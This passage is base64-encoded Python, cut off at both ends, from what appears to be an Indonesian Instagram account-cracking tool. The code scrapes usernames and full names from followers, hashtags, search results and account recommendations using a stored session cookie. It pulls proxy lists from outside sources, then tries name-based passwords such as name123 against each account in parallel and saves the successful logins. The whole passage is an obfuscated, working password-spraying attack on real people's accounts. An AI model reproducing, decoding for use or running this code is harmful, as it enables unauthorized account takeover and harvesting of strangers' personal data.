VzZXIgPSBpbnB1dChmIlxue0h9W3tQfT97SH1de1B9IFVzZXIgOntLfSAiKQogICAgICAgIGlmIF9fX3VzZXJbOjFdIGluIFsnMScsJzInLCczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMCddOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IEd1bmFrYW4gVXNlcm5hbWUiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIF9fX3JveiA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20ve19fX3VzZXJ9Lz9fX2E9MScsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKClbJ2dyYXBocWwnXVsndXNlciddCiAgICAgICAgICAgIHByaW50KGYie0h9W3tQfT97SH1de1B9IE5hbWUgOntLfSB7X19fcm96WydmdWxsX25hbWUnXX1cbiIpCiAgICAgICAgICAgIF9fX2ZpbGUgPSAoX19fcm96WydmdWxsX25hbWUnXS5yZXBsYWNlKCcgJywnXycpKycudHh0JykKICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXM6CiAgICAgICAgICAgIF9fX3phayA9IHNlcy5nZXQoZidodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvZnJpZW5kc2hpcHMve19fX3JvelsiaWQiXX0vZm9sbG93ZXJzLz9jb3VudD01MDAwJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBvcGVuKCdEYXRhL2Nva2kudHh0JywncicpLnJlYWQoKX0pLmpzb24oKQogICAgICAgICAgICBmb3IgeiBpbiBfX196YWtbJ3VzZXJzJ106CiAgICAgICAgICAgICAgICBvcGVuKCdEdW1wLycrX19fZmlsZSwgJ2EnKS53cml0ZSh6Wyd1c2VybmFtZSddKyc8PT4nK3pbJ2Z1bGxfbmFtZSddKydcbicpCiAgICAgICAgICAgICAgICBwcmludChmIntQfXt6Wyd1c2VybmFtZSddfTw9Pnt6WydmdWxsX25hbWUnXX0iKQogICAgICAgICAgICBwcmludChmIlxue0J9W3tQfSp7Qn1de1B9IFNlbGVzYWkuLi4iKQogICAgICAgICAgICBwcmludChmIntCfVt7UH0/e0J9XXtQfSBGaWxlIFRlcnNpbXBhbiBEaSA6e0t9IER1bXAve19fX2ZpbGV9IikKICAgICAgICAgICAgaW5wdXQoZiJ7TX1be1B9S2VtYmFsaXtNfV17UH0iKTtfX19tZW51X19fKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRHVtcCBHYWdhbCIpCiAgICBleGNlcHQgKENvbm5lY3Rpb25FcnJvcik6CiAgICAgICAgZXhpdChmIntQfVt7S30he1B9XXtLfSBLb25la3NpIEVycm9yIikKIyBEdW1wIEFjdGl2aXR5CmRlZiBfX19hY3Rpdml0eV9fXygpOgogICAgdHJ5OgogICAgICAgIF9fX2ZpbGUgPSBpbnB1dChmIlxue0h9W3tQfT97SH1de1B9IE5hbWEgRmlsZSA6e0t9ICIpLnJlcGxhY2UoJyAnLCdfJykKICAgICAgICBpZiBfX19maWxlIGluIFsnJywnICddOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IEphbmdhbiBLb3NvbmciKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie1B9ICIpCiAgICAgICAgICAgIF9fX3JveiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9hY3Rpdml0eS8/X19hPTEnLCBoZWFkZXJzID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tRzk3M0YgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYgSW5zdGFncmFtIDE2Ni4xLjAuNDIuMjQ1IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjA0Mjsgc2Ftc3VuZzsgU00tRzk3M0Y7IGJleW9uZDE7IGV4eW5vczk4MjA7IGVuX0dCOyAyNTYwOTkyMDQpJywgJ2Nvb2tpZSc6IG9wZW4oJ0RhdGEvY29raS50eHQnLCdyJykucmVhZCgpfSkKICAgICAgICAgICAgX19femFrID0gcmUuZmluZGFsbCgnInVzZXJuYW1lIjoiKC4qPykiLCJmdWxsX25hbWUiOiIoLio/KSIsJywgX19fcm96LnRleHQpCiAgICAgICAgICAgIGZvciB6IGluIF9fX3phazoKICAgICAgICAgICAgICAgIG9wZW4oJ0R1bXAvJytfX19maWxlLCAnYScpLndyaXRlKHpbMF0rJzw9PicrelsxXSsnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7elswXX08PT57elsxXX0iKQogICAgICAgICAgICBwcmludChmIlxue0J9W3tQfSp7Qn1de1B9IFNlbGVzYWkuLi4iKQogICAgICAgICAgICBwcmludChmIntCfVt7UH0/e0J9XXtQfSBGaWxlIFRlcnNpbXBhbiBEaSA6e0t9IER1bXAve19fX2ZpbGV9IikKICAgICAgICAgICAgaW5wdXQoZiJ7TX1be1B9S2VtYmFsaXtNfV17UH0iKTtfX19tZW51X19fKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IHtlfSIpCiMgRHVtcCBCZXJhbmRhCmRlZiBfX19iZXJhbmRhX19fKCk6CiAgICB0cnk6CiAgICAgICAgX19fZmlsZSA9IGlucHV0KGYiXG57SH1be1B9P3tIfV17UH0gTmFtYSBGaWxlIDp7S30gIikucmVwbGFjZSgnICcsJ18nKQogICAgICAgIGlmIF9fX2ZpbGUgaW4gWycnLCcgJ106CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gSmFuZ2FuIEtvc29uZyIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7UH0gIikKICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvZmVlZC9yZWVsc190cmF5LycsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKCkKICAgICAgICAgICAgZm9yIHogaW4gX19fcm96Wyd0cmF5J106CiAgICAgICAgICAgICAgICBvcGVuKCdEdW1wLycrX19fZmlsZSwgJ2EnKS53cml0ZSh6Wyd1c2VyJ11bJ3VzZXJuYW1lJ10rJzw9PicrelsndXNlciddWydmdWxsX25hbWUnXSsnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7elsndXNlciddWyd1c2VybmFtZSddfTw9Pnt6Wyd1c2VyJ11bJ2Z1bGxfbmFtZSddfSIpCiAgICAgICAgICAgIHByaW50KGYiXG57Qn1be1B9KntCfV17UH0gU2VsZXNhaS4uLiIpCiAgICAgICAgICAgIHByaW50KGYie0J9W3tQfT97Qn1de1B9IEZpbGUgVGVyc2ltcGFuIERpIDp7S30gRHVtcC97X19fZmlsZX0iKQogICAgICAgICAgICBpbnB1dChmIntNfVt7UH1LZW1iYWxpe019XXtQfSIpO19fX21lbnVfX18oKQogICAgZXhjZXB0IChLZXlFcnJvcik6CiAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBEdW1wIEdhZ2FsIikKICAgIGV4Y2VwdCAoQ29ubmVjdGlvbkVycm9yKToKICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IEtvbmVrc2kgRXJyb3IiKQojIER1bXAgSGFzdGFnCmRlZiBfX19oYXN0YWdfX18oKToKICAgIHRyeToKICAgICAgICBfX190YWcgPSBpbnB1dChmIlxue0h9W3tQfT97SH1de1B9IEhhc3RhZyA6e0t9ICIpLnJlcGxhY2UoJyMnLCcnKQogICAgICAgIGlmIF9fX3RhZyBpbiBbJycsJyAnXToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBKYW5nYW4gS29zb25nIikKICAgICAgICBfX19maWxlID0gaW5wdXQoZiJ7SH1be1B9P3tIfV17UH0gTmFtYSBGaWxlIDp7S30gIikucmVwbGFjZSgnICcsJ18nKQogICAgICAgIGlmIF9fX2ZpbGUgaW4gWycnLCcgJ106CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gSmFuZ2FuIEtvc29uZyIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7UH0gIikKICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9leHBsb3JlL3RhZ3Mve19fX3RhZ30vP19fYT0xJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBvcGVuKCdEYXRhL2Nva2kudHh0JywncicpLnJlYWQoKX0pCiAgICAgICAgICAgIF9fX3phayA9IHJlLmZpbmRhbGwoJyJ1c2VybmFtZSI6IiguKj8pIiwiZnVsbF9uYW1lIjoiKC4qPykiLCcsIF9fX3Jvei50ZXh0KQogICAgICAgICAgICBmb3IgeiBpbiBfX196YWs6CiAgICAgICAgICAgICAgICBvcGVuKCdEdW1wLycrX19fZmlsZSwgJ2EnKS53cml0ZSh6WzBdKyc8PT4nK3pbMV0rJ1xuJykKICAgICAgICAgICAgICAgIHByaW50KGYie3pbMF19PD0+e3pbMV19IikKICAgICAgICAgICAgcHJpbnQoZiJcbntCfVt7UH0qe0J9XXtQfSBTZWxlc2FpLi4uIikKICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9P3tCfV17UH0gRmlsZSBUZXJzaW1wYW4gRGkgOntLfSBEdW1wL3tfX19maWxlfSIpCiAgICAgICAgICAgIGlucHV0KGYie019W3tQfUtlbWJhbGl7TX1de1B9Iik7X19fbWVudV9fXygpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSB7ZX0iKQojIER1bXAgU2VhcmNoCmRlZiBfX19zZWFyY2hfX18oKToKICAgIHRyeToKICAgICAgICBfX191c2VyID0gaW5wdXQoZiJcbntIfVt7UH0/e0h9XXtQfSBVc2VyIDp7S30gIikKICAgICAgICBpZiBfX191c2VyWzoxXSBpbiBbJzEnLCcyJywnMycsJzQnLCc1JywnNicsJzcnLCc4JywnOScsJzAnXToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBHdW5ha2FuIFVzZXJuYW1lIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3tfX191c2VyfS8/X19hPTEnLCBoZWFkZXJzID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tRzk3M0YgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYgSW5zdGFncmFtIDE2Ni4xLjAuNDIuMjQ1IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjA0Mjsgc2Ftc3VuZzsgU00tRzk3M0Y7IGJleW9uZDE7IGV4eW5vczk4MjA7IGVuX0dCOyAyNTYwOTkyMDQpJywgJ2Nvb2tpZSc6IG9wZW4oJ0RhdGEvY29raS50eHQnLCdyJykucmVhZCgpfSkuanNvbigpWydncmFwaHFsJ11bJ3VzZXInXQogICAgICAgICAgICBwcmludChmIntIfVt7UH0/e0h9XXtQfSBOYW1lIDp7S30ge19fX3JvelsnZnVsbF9uYW1lJ119XG4iKQogICAgICAgICAgICBfX19maWxlID0gKF9fX3JvelsnZnVsbF9uYW1lJ10ucmVwbGFjZSgnICcsJ18nKSsnLnR4dCcpCiAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgc2VzOgogICAgICAgICAgICBfX196YWsgPSBzZXMuZ2V0KGYnaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2Zic2VhcmNoL2FjY291bnRzX3JlY3MvP3RhcmdldF91c2VyX2lkPXtfX19yb3pbImlkIl19JmluY2x1ZGVfZnJpZW5kc2hpcF9zdGF0dXM9dHJ1ZScsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKCkKICAgICAgICAgICAgZm9yIHogaW4gX19femFrWyd1c2VycyddOgogICAgICAgICAgICAgICAgb3BlbignRHVtcC8nK19fX2ZpbGUsICdhJykud3JpdGUoelsndXNlcm5hbWUnXSsnPD0+Jyt6WydmdWxsX25hbWUnXSsnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH17elsndXNlcm5hbWUnXX08PT57elsnZnVsbF9uYW1lJ119IikKICAgICAgICAgICAgcHJpbnQoZiJcbntIfVt7UH0qe0h9XXtQfSBTZWxlc2FpLi4uIikKICAgICAgICAgICAgcHJpbnQoZiJ7SH1be1B9P3tIfV17UH0gRmlsZSBUZXJzaW1wYW4gRGkgOntLfSBEdW1wL3tfX19maWxlfSIpCiAgICAgICAgICAgIGlucHV0KGYie019W3tQfUtlbWJhbGl7TX1de1B9Iik7X19fbWVudV9fXygpCiAgICBleGNlcHQgKEtleUVycm9yKToKICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IER1bXAgR2FnYWwiKQogICAgZXhjZXB0IChDb25uZWN0aW9uRXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be0t9IXtQfV17S30gS29uZWtzaSBFcnJvciIpCiMgRHVtcCBRdWVyeQpkZWYgX19fcXVlcnlfX18oKToKICAgIHRyeToKICAgICAgICBfX19xdWVyeSA9IGlucHV0KGYiXG57SH1be1B9P3tIfV17UH0gUXVlcnkgOntLfSAiKQogICAgICAgIGlmIF9fX3F1ZXJ5IGluIFsnJywnICddOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IEphbmdhbiBLb3NvbmciKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie1B9ICIpCiAgICAgICAgICAgIF9fX2ZpbGUgPSBfX19xdWVyeS5yZXBsYWNlKCcgJywnXycpKycudHh0JwogICAgICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3dlYi9zZWFyY2gvdG9wc2VhcmNoLz9jb250ZXh0PWJsZW5kZWQmcXVlcnk9e19fX3F1ZXJ5fSZyYW5rX3Rva2VuPTAuMzk1MzU5MjMxODI3MDg5MyZjb3VudD01MDAwJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBvcGVuKCdEYXRhL2Nva2kudHh0JywncicpLnJlYWQoKX0pLmpzb24oKQogICAgICAgICAgICBmb3IgeiBpbiBfX19yb3pbJ3VzZXJzJ106CiAgICAgICAgICAgICAgICBvcGVuKCdEdW1wLycrX19fZmlsZSwgJ2EnKS53cml0ZSh6Wyd1c2VyJ11bJ3VzZXJuYW1lJ10rJzw9PicrelsndXNlciddWydmdWxsX25hbWUnXSsnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7elsndXNlciddWyd1c2VybmFtZSddfTw9Pnt6Wyd1c2VyJ11bJ2Z1bGxfbmFtZSddfSIpCiAgICAgICAgICAgIHByaW50KGYiXG57Qn1be1B9KntCfV17UH0gU2VsZXNhaS4uLiIpCiAgICAgICAgICAgIHByaW50KGYie0J9W3tQfT97Qn1de1B9IEZpbGUgVGVyc2ltcGFuIERpIDp7S30gRHVtcC97X19fZmlsZX0iKQogICAgICAgICAgICBpbnB1dChmIntNfVt7UH1LZW1iYWxpe019XXtQfSIpO19fX21lbnVfX18oKQogICAgZXhjZXB0IChLZXlFcnJvcik6CiAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBEdW1wIEdhZ2FsIikKICAgIGV4Y2VwdCAoQ29ubmVjdGlvbkVycm9yKToKICAgICAgICBleGl0KGYie1B9W3tLfSF7UH1de0t9IEtvbmVrc2kgRXJyb3IiKQojIER1bXAgRGFyaSBFbWFpbApkZWYgX19fZW1haWxfX18oKToKICAgIHRyeToKICAgICAgICBfX19uYW1hID0gaW5wdXQoZiJcbntIfVt7UH0/e0h9XXtQfSBOYW1hIDp7S30gIikucmVwbGFjZSgnICcsJycpCiAgICAgICAgaWYgX19fbmFtYSBpbiBbJycsJyAnXToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBKYW5nYW4gS29zb25nIikKICAgICAgICBfX19kb21haW4gPSBpbnB1dChmIntIfVt7UH0/e0h9XXtQfSBEb21haW4gOntLfSAiKQogICAgICAgIGlmIF9fX2RvbWFpbiBpbiBbJ0BnbWFpbC5jb20nLCdAeWFob28uY29tJywnQGhvdG1haWwuY29tJywnQGVtYWlsLmNvbScsJ0BtYWlsLmNvbScsJ0BvdXRsb29rLmNvbScsJ0B5YW5kZXguY29tJ106CiAgICAgICAgICAgIF9fX2xpbWl0ID0gaW50KGlucHV0KGYie0h9W3tQfT97SH1de1B9IExpbWl0IDp7S30gIikpCiAgICAgICAgICAgIGlmIF9fX2xpbWl0ID49MTAwMToKICAgICAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gTWFrc2ltYWwgMTAwMCIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmIntQfSAiKQogICAgICAgICAgICAgICAgX19fZmlsZSA9ICdEdW1wLycrX19fbmFtYSsnLnR4dCcKICAgICAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKF9fX2xpbWl0KToKICAgICAgICAgICAgICAgICAgICBfX19ub21vciA9IHJhbmRvbS5yYW5kaW50KDEsIDk5OSkKICAgICAgICAgICAgICAgICAgICBfX191c2VyID0gX19fbmFtYSArIHN0cihfX19ub21vcikgKyBfX19kb21haW4gKyAnPD0+JyArIF9fX25hbWEgKyAnICcgKyBzdHIoX19fbm9tb3IpCiAgICAgICAgICAgICAgICAgICAgb3BlbihfX19maWxlLCAnYScpLndyaXRlKGYne19fX3VzZXJ9XG4nKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYie19fX3VzZXJ9IikKICAgICAgICAgICAgICAgIHByaW50KGYiXG57Qn1be1B9KntCfV17UH0gU2VsZXNhaS4uLiIpCiAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0/e0J9XXtQfSBGaWxlIFRlcnNpbXBhbiBEaSA6e0t9IHtfX19maWxlfSIpCiAgICAgICAgICAgICAgICBpbnB1dChmIntNfVt7UH1LZW1iYWxpe019XXtQfSIpO19fX21lbnVfX18oKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRG9tYWluICdAZ21haWwuY29tJywnQHlhaG9vLmNvbScsJ0Bob3RtYWlsLmNvbScsJ0BlbWFpbC5jb20nLCdAbWFpbC5jb20nLCdAb3V0bG9vay5jb20nLCdAeWFuZGV4LmNvbSciKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0ge2V9IikKIyBQcm94eQpkZWYgX19fcHJveHlfX18oKToKICAgIHRyeToKICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLnByb3h5c2NyYXBlLmNvbS92Mi8/cmVxdWVzdD1kaXNwbGF5cHJveGllcyZwcm90b2NvbD1zb2NrczQmdGltZW91dD0xMDAwMDAmY291bnRyeT1hbGwmc3NsPWFsbCZhbm9ueW1pdHk9YWxsJykudGV4dAogICAgICAgIG9wZW4oJ0RhdGEvcHJveHkudHh0JywgJ3cnKS53cml0ZShfX19yb3opCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUm96aGFrWEQvUHJlbWl1bS9tYWluL0RhdGEvcHJveHkyLnR4dCcpLnRleHQKICAgICAgICBvcGVuKCdEYXRhL3Byb3h5LnR4dCcsICd3Jykud3JpdGUoX19fcm96KQogICAgX19fY3JhY2tfX18oKQojIENyYWNrCmNsYXNzIF9fX2NyYWNrX19fOgogICAgCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5raWxsID0gMAogICAgICAgIHNlbGYub2sgPSBbXQogICAgICAgIHNlbGYuY3AgPSBbXQogICAgICAgIHByaW50KGYiXG57SH1be1B9MXtIfV17UH0gR3VuYWthbiBQYXNzd29yZCB7SH1be0t9bmFtYSwgbmFtYTEyMywgbmFtYTEyMzQ1e0h9XXtLfSIpCiAgICAgICAgcHJpbnQoZiJ7SH1be1B9MntIfV17UH0gR3VuYWthbiBQYXNzd29yZCB7SH1be0t9bmFtYSwgbmFtYTEyMywgbmFtYTEyMzQsIG5hbWExMjM0NXtIfV17S30iKQogICAgICAgIHByaW50KGYie0h9W3tQfTN7SH1de1B9IEd1bmFrYW4gUGFzc3dvcmQge0h9W3tLfW5hbWEsIG5hbWExMjMsIG5hbWExMjM0LCBuYW1hMTIzNDUsIG5hbWExMjM0NTZ7SH1de0t9IikKICAgICAgICBwcmludChmIntIfVt7UH00e0h9XXtQfSBHdW5ha2FuIFBhc3N3b3JkIE1hbnVhbCB7SH1be0t9PjV7SH1de0t9XG4iKQogICAgICAgIF9fX3BpbGloID0gaW5wdXQoZiJ7Qn1be1B9P3tCfV17UH0gUGlsaWggOntIfSAiKQogICAgICAgIGlmIF9fX3BpbGloIGluIFsnNCcsJzA0J106CiAgICAgICAgICAgIHB3eCA9IGlucHV0KGYie0J9W3tQfT97Qn1de1B9IFBhc3N3b3JkIDp7SH0gIikuc3BsaXQoJywnKQogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5fX19kdW1wID0gaW5wdXQoZiJ7Qn1be1B9P3tCfV17UH0gRmlsZSBEdW1wIDp7SH0gIikKICAgICAgICAgICAgc2VsZi5fX19maWxlID0gb3BlbihzZWxmLl9fX2R1bXAsICdyJykucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIGV4Y2VwdCAoSU9FcnJvcik6CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRmlsZSBUaWRhayBBZGEiKQogICAgICAgIHRyeToKICAgICAgICAgICAgcHJpbnQoZiJcbntIfVt7UH3igKJ7SH1de1B9IEhhc2lsIE9rIFRlcnNpbXBhbiBEaSBSZXN1bHRzL09rLnR4dCIpCiAgICAgICAgICAgIHByaW50KGYie0h9W3tQfeKAontIfV17UH0gSGFzaWwgQ3AgVGVyc2ltcGFuIERpIFJlc3VsdHMvQ3AudHh0XG4iKQogICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgKF9fX2hheXVrKToKICAgICAgICAgICAgICAgIGZvciBfX191c2VyIGluIHNlbGYuX19fZmlsZToKICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSwgbmFtYSA9IF9fX3VzZXIuc3BsaXQoJzw9PicpCiAgICAgICAgICAgICAgICAgICAgeiA9IG5hbWEuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgIGlmIF9fX3BpbGloIGluIFsnMScsJzAxJ106CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gW25hbWEucmVwbGFjZSgnICcsJycpLCBuYW1hLCB6WzBdKycxMjMnLCB6WzBdKycxMjM0NSddCiAgICAgICAgICAgICAgICAgICAgZWxpZiBfX19waWxpaCBpbiBbJzInLCcwMiddOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IFtuYW1hLnJlcGxhY2UoJyAnLCcnKSwgbmFtYSwgelswXSsnMTIzJywgelswXSsnMTIzNCcsIHpbMF0rJzEyMzQ1J10KICAgICAgICAgICAgICAgICAgICBlbGlmIF9fX3BpbGloIGluIFsnMycsJzAzJ106CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gW25hbWEucmVwbGFjZSgnICcsJycpLCBuYW1hLCB6WzBdKycxMjMnLCB6WzBdKycxMjM0JywgelswXSsnMTIzNDUnLCB6WzBdKycxMjM0NTYnXQogICAgICAgICAgICAgICAgICAgIGVsaWYgX19fcGlsaWggaW4gWyc0JywnMDQnXToKICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBwd3gKICAgICAgICAgICAgICAgICAgICBlbHNlOgogIC